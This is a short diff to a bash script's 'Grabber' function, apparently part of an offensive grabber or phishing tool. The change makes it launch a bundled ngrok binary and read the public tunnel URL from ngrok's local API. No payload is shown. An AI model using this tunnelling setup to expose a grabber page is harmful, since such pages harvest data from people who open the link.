@@ -169,7 +169,7 @@ function Grabber {
     printf "${GREEN}\n\n[+]${WHITE}RUNNING NGROK SERVER...\n"
     sleep 4
     printf "${GREEN}\n[+]${WHITE}GENERATING URL...\n"
-    ngrok http $Port >/dev/null 2>&1 &
+    Tunnel/./ngrok http $Port >/dev/null 2>&1 &
     sleep 9
     link=$(curl -s -N http://127.0.0.1:4040/api/tunnels|sed 's#"# #g'|sed 's#http#\nhttp#g'|sed 's#.io#.io\n#g'|grep https|head -n 1)
     #link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
